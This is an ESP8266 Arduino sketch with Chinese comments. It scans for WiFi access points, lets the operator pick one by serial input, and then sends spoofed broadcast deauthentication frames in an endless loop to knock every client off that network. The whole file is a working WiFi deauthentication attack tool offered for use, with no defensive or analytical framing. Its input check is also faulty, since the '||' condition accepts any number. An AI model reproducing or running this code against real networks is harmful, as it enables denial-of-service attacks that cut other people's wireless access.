#include <ESP8266WiFi.h>
#include <WiFiClient.h>
extern "C" {
#include "user_interface.h"
}

//Deauthentication帧
uint8_t deauthPacket[26] = {
  /*  0 - 1  */ 0xC0, 0x00,                         //类型, 子类型 C0: 结束鉴权 (A0: 解除连接)
  /*  2 - 3  */ 0x00, 0x00,                         //时长 (SDK 自动填充这部分)
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //接收方 (目标, 广播)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //发送方 (AP)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //发送方 (AP)
  /* 22 - 23 */ 0x00, 0x00,                         //分片&序列号
  /* 24 - 25 */ 0x01, 0x00                          //原因(1 = 未知原因)
};

void setup() {
  Serial.begin(115200);
  wifi_set_opmode(STATION_MODE);
  uint8_t i;

//扫描热点
  int ap_count = WiFi.scanNetworks();
  int selected;
  Serial.println();
  for(i = 0; i < ap_count; i++) {
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.RSSI(i));
    Serial.println(")");
  }

//选择热点
  while(true) {
    Serial.println("Select AP...");
    while(!Serial.available())
      delay(50);
    selected = Serial.parseInt();
    if(selected < ap_count || selected > 0)
      break;
  }

//设置参数
  Serial.print("Attacking ");
  Serial.println(WiFi.SSID(selected - 1));
  Serial.print('[');
  for (i = 0; i < 6; i++) {
    if (WiFi.BSSID(selected - 1)[i] < 0x10)
      Serial.print('0');
    Serial.print(WiFi.BSSID(selected - 1)[i], HEX);
    if (i < 5)
      Serial.print(':');
  }
  Serial.print("] on CH");
  Serial.println(WiFi.channel(selected - 1));

  wifi_set_channel(WiFi.channel(selected - 1));
  for(i = 0; i < 6; i++)
    deauthPacket[10 + i] = deauthPacket[16 + i] = WiFi.BSSID(selected - 1)[i];
}

void loop() {
//开启混杂模式
  wifi_promiscuous_enable(1);
//循环攻击
  if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == -1) {
    Serial.println("Deauth error");//若不断打印这句话，请检查环境配置是否正确
    return;
  }
  delay(10);//延时，避免数据包堵塞
}
